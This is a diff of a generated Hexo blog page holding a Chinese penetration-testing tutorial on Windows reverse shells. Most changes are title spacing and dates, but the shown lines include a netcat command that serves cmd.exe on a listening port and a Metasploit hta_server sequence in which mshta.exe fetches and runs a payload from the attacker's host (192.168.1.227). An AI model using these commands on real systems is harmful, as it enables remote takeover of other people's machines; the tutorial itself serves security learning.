@@ -6,7 +6,7 @@
     
 
     
-    <title>Windows 反弹shell | Hexo</title>
+    <title>Windows 反弹 shell | Hexo</title>
     
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
     
@@ -14,14 +14,14 @@
     
     <meta name="description" content="以下本地环境攻击机的 IP ：192.168.1.227  介绍几种 Windows 反弹 shell 的方式，有的是 win 系统自带，有些是第三方工具&#x2F;脚本，实战中根据情况选择使用。 一、NC 反弹 shell先把 nc 上传到目标 windows 机器 NC 正向 shell 被控端： 1nc -lvvp 6666 -e cmd.exe  控制端： 1nc 192.168.1.62 666">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Windows 反弹shell">
+<meta property="og:title" content="Windows 反弹 shell">
 <meta property="og:url" content="http://yoursite.com/2020/10/01/windows%E5%8F%8D%E5%BC%B9shell/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="以下本地环境攻击机的 IP ：192.168.1.227  介绍几种 Windows 反弹 shell 的方式，有的是 win 系统自带，有些是第三方工具&#x2F;脚本，实战中根据情况选择使用。 一、NC 反弹 shell先把 nc 上传到目标 windows 机器 NC 正向 shell 被控端： 1nc -lvvp 6666 -e cmd.exe  控制端： 1nc 192.168.1.62 666">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://my.lipeilipei.top/images/2020/20201120123010.png">
 <meta property="article:published_time" content="2020-10-01T04:00:00.000Z">
-<meta property="article:modified_time" content="2020-11-20T04:30:35.732Z">
+<meta property="article:modified_time" content="2020-11-21T07:07:24.320Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="渗透">
 <meta property="article:tag" content="安全">
@@ -176,7 +176,7 @@ var _hmt = _hmt || [];
                 
     
         <h1 class="article-title" itemprop="name">
-        Windows 反弹shell
+        Windows 反弹 shell
         </h1>
     
 
@@ -196,7 +196,7 @@ var _hmt = _hmt || [];
 <div class="article-date">
   <i class="fa fa-calendar-plus-o"></i>
   <a href="/2020/10/01/windows%E5%8F%8D%E5%BC%B9shell/" class="article-date">
-     <time datetime="2020-11-20T04:30:35.732Z" itemprop="dateModified">2020-11-20</time>
+     <time datetime="2020-11-21T07:07:24.320Z" itemprop="dateModified">2020-11-21</time>
   </a>
 </div>
 
@@ -251,7 +251,7 @@ var _hmt = _hmt || [];
 <h2 id="二、Mshta-反弹-shell"><a href="#二、Mshta-反弹-shell" class="headerlink" title="二、Mshta 反弹 shell"></a>二、Mshta 反弹 shell</h2><blockquote>
 <p>Mshta.exe 是用于负责解释运行 HTA(HTML应用程序)文件的 Windows OS 实用程序。 可以运行 JavaScript 或<br> VBScript 的 HTML 文件。</p>
 </blockquote>
-<h5 id="1-通过-Metasploit-的-hta-server模块发起-HTA-攻击"><a href="#1-通过-Metasploit-的-hta-server模块发起-HTA-攻击" class="headerlink" title="1. 通过 Metasploit 的 hta_server模块发起 HTA 攻击"></a>1. 通过 Metasploit 的 hta_server模块发起 HTA 攻击</h5><figure class="highlight plain"><figcaption><span>exploit/windows/misc/hta_server</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(windows&#x2F;misc&#x2F;hta_server) &gt; set srvhost 192.168.1.227</span><br><span class="line">msf exploit(windows&#x2F;misc&#x2F;hta_server) &gt; exploit –j</span><br><span class="line"></span><br><span class="line">mshta.exe http:&#x2F;&#x2F;192.168.1.227:8080&#x2F;gwm6lZr.hta</span><br></pre></td></tr></table></figure>
+<h5 id="1-通过-Metasploit-的-hta-server模块发起-HTA-攻击"><a href="#1-通过-Metasploit-的-hta-server模块发起-HTA-攻击" class="headerlink" title="1. 通过 Metasploit 的 hta_server模块发起 HTA 攻击"></a>1. 通过 Metasploit 的 hta_server模块发起 HTA 攻击</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;misc&#x2F;hta_server</span><br><span class="line">msf exploit(windows&#x2F;misc&#x2F;hta_server) &gt; set srvhost 192.168.1.227</span><br><span class="line">msf exploit(windows&#x2F;misc&#x2F;hta_server) &gt; exploit –j</span><br><span class="line"></span><br><span class="line">mshta.exe http:&#x2F;&#x2F;192.168.1.227:8080&#x2F;gwm6lZr.hta</span><br></pre></td></tr></table></figure>
 
 <p>在目标机器上命令行中使用 mshta 执行 msf 生成的 URL，msf 就能获得 session</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta.exe http:&#x2F;&#x2F;192.168.1.227:8080&#x2F;gwm6lZr.hta</span><br></pre></td></tr></table></figure>
@@ -412,13 +412,13 @@ window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMin
             "@type": "Person",
             "name": "John Doe"
         },
-        "headline": "Windows 反弹shell",
+        "headline": "Windows 反弹 shell",
         "image": "http://yoursite.comhttp://my.lipeilipei.top/images/2020/20201120123010.png",
         "keywords": "渗透 安全",
         "genre": "安全",
         "datePublished": "2020-10-01",
         "dateCreated": "2020-10-01",
-        "dateModified": "2020-11-20",
+        "dateModified": "2020-11-21",
         "url": "http://yoursite.com/2020/10/01/windows反弹shell/",
         "description": "
 以下本地环境攻击机的 IP ：192.168.1.227
@@ -431,7 +431,7 @@ NC 正向 shell
 
 控制端：
 1nc 192.168.1.62 666",
-        "wordCount": 768
+        "wordCount": 771
     }
 </script>
 
@@ -490,7 +490,7 @@ NC 正向 shell
                             <a href="/2020/10/01/windows%E5%8F%8D%E5%BC%B9shell/" class="thumbnail">
     
     
-        <span style="background-image:url(http://my.lipeilipei.top/images/2020/20201120123010.png)" alt="Windows 反弹shell" class="thumbnail-image"></span>
+        <span style="background-image:url(http://my.lipeilipei.top/images/2020/20201120123010.png)" alt="Windows 反弹 shell" class="thumbnail-image"></span>
     
     
 </a>
@@ -499,7 +499,7 @@ NC 正向 shell
                         
                         <div class="item-inner">
                             <p class="item-category"><a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a></p>
-                            <p class="item-title"><a href="/2020/10/01/windows%E5%8F%8D%E5%BC%B9shell/" class="title">Windows 反弹shell</a></p>
+                            <p class="item-title"><a href="/2020/10/01/windows%E5%8F%8D%E5%BC%B9shell/" class="title">Windows 反弹 shell</a></p>
                             <p class="item-date"><time datetime="2020-10-01T04:00:00.000Z" itemprop="datePublished">2020-10-01</time></p>
                         </div>
                     </li>
